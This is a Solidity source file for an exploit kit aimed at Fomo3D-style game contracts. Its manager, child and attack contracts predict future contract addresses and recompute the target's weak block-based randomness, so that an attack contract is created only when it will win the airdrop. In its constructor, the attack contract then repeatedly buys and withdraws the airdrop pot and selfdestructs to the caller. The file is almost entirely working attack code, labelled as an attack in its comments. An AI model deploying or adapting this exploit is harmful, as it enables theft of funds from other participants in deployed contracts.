pragma solidity ^0.4.24;

// author yangkun

// fomo3d 空投管理合约
// fomo3d airdrop manage contract
contract Fomo3dAirDropManageContract {

    // 子合约池
    Fomo3dAirDropChildContract []  public pool_;

    // administrators
    mapping (address => bool) public admins_;

    // pool size
    uint256 public poolSize_ = 0;

    constructor()
    public
    {
        admins_[msg.sender] = true;
    }

    // 添加子合约
    function addChild(uint256 count) 
    external
    {
        require(admins_[msg.sender], "admins only");

        for( uint256 i=0; i<count; i++ ) {
            pool_.push(new Fomo3dAirDropChildContract());
        }

        poolSize_ += count;
    }

    // 提现
    function withdraw()
    external
    {
        require(admins_[msg.sender], "admins only");

        msg.sender.transfer(address(this).balance);
    }
    
    // add admin
    function addAdmin(address addr)
    external
    {
        require(admins_[msg.sender], "admins only");
        require(!admins_[addr], "admin exist");
        
        admins_[addr] = true;
    }

    // 发动攻击
    // multiple {fomo3d:4, lastwinner:10}
    function checkAndAttack(address target, uint256 multiple)
    external
    payable
    {
        require(admins_[msg.sender], "admins only");
        require(msg.value>=100000000000000000, "eth not enough");

        Fomo3dLongContractInterface fomo3dLong = Fomo3dLongContractInterface(target);
        uint256 airDropTracker = fomo3dLong.airDropTracker_();

        // 遍历子合约，寻找满足条件子合约创建攻击合约
        for( uint256 i=0; i<poolSize_; i++) {
            Fomo3dAirDropChildContract childContract = pool_[i];

            if( childContract.check(airDropTracker) ) {
                childContract.attack.value(msg.value)(target, multiple);
                return ;
            }
        }

        revert();
    }

}

// fomo3d 空投管理子合约
// fomo3d airdrop manage child contract
contract Fomo3dAirDropChildContract {

    uint256 public nonce_=0x01;
    uint256 public seed_ =0;
    
    constructor()
    public
    {
    }
    
    // start attack
    function attack(address target, uint256 multiple) 
    external
    payable
    {
        //  create the attack contract
        (new Fomo3dAirDropAttackContract).value(msg.value)(target, seed_, multiple);

        nonce_++;
    }

    function check(uint256 airDropTracker)
    external
    returns (bool)
    {
        // 计算攻击合约地址
        address addr = Fomo3dAirDropUtils.caculateAddress(address(this), nonce_);
        seed_ = Fomo3dAirDropUtils.airdropSeed(addr);

        return seed_ < airDropTracker; 
    }
}

// fomo3d 攻击合约
contract Fomo3dAirDropAttackContract {
    using SafeMath for *;
    
    Fomo3dLongContractInterface targetContract_;
    
    constructor(address target, uint256 seed, uint256 multiple)
    public
    payable
    {
        targetContract_ = Fomo3dLongContractInterface(target);

        if( seed == 0 ) {
            uint256 airDropPot = targetContract_.airDropPot_();
            uint256 minPot = multiple.mul(msg.value);

            // 重复攻击
            while( airDropPot > minPot ) {
                buyAndWithdraw(target);
                airDropPot = targetContract_.airDropPot_();
            }
        } else {
            buyAndWithdraw(target);
        }

        selfdestruct(tx.origin);
    }

    function buyAndWithdraw(address target)
    internal
    {
        // send eth the fomo3d contract
        if(!target.call.value(msg.value)()) revert();

        // withdraw the fomo3d airdrop
        targetContract_.withdraw();
    }
    
}

interface Fomo3dLongContractInterface {
    function airDropTracker_() external returns (uint256);
    function airDropPot_() external returns (uint256);
    function withdraw() external;
}

library Fomo3dAirDropUtils {
    using SafeMath for *;

    function caculateAddress(address origin, uint nonce) 
    pure 
    external
    returns (address) {
        if(nonce == 0x00)     return address(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), origin, byte(0x80))));
        if(nonce <= 0x7f)     return address(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), origin, byte(nonce))));
        if(nonce <= 0xff)     return address(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), origin, byte(0x81), uint8(nonce))));
        if(nonce <= 0xffff)   return address(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), origin, byte(0x82), uint16(nonce))));
        if(nonce <= 0xffffff) return address(keccak256(abi.encodePacked(byte(0xd9), byte(0x94), origin, byte(0x83), uint24(nonce))));
        return address(keccak256(abi.encodePacked(byte(0xda), byte(0x94), origin, byte(0x84), uint32(nonce)))); // more than 2^32 nonces not realistic
    }

    // compute the airdrop 
    function airdropSeed(address addr)
    view
    external
    returns(uint256)
    {
        
        uint256 seed = uint256(keccak256(abi.encodePacked(
            
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(addr)))) / (now)).add
            (block.number)
            
        )));

        return (seed - ((seed / 1000) * 1000));
    }
}

library SafeMath {
    
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) 
        internal 
        pure 
        returns (uint256 c) 
    {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        require(c / a == b, "SafeMath mul failed");
        return c;
    }

    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256) 
    {
        require(b <= a, "SafeMath sub failed");
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256 c) 
    {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
    
    /**
     * @dev gives square root of given x.
     */
    function sqrt(uint256 x)
        internal
        pure
        returns (uint256 y) 
    {
        uint256 z = ((add(x,1)) / 2);
        y = x;
        while (z < y) 
        {
            y = z;
            z = ((add((x / z),z)) / 2);
        }
    }
    
    /**
     * @dev gives square. multiplies x by x
     */
    function sq(uint256 x)
        internal
        pure
        returns (uint256)
    {
        return (mul(x,x));
    }
    
    /**
     * @dev x to the power of y 
     */
    function pwr(uint256 x, uint256 y)
        internal 
        pure 
        returns (uint256)
    {
        if (x==0)
            return (0);
        else if (y==0)
            return (1);
        else 
        {
            uint256 z = x;
            for (uint256 i=1; i < y; i++)
                z = mul(z,x);
            return (z);
        }
    }
}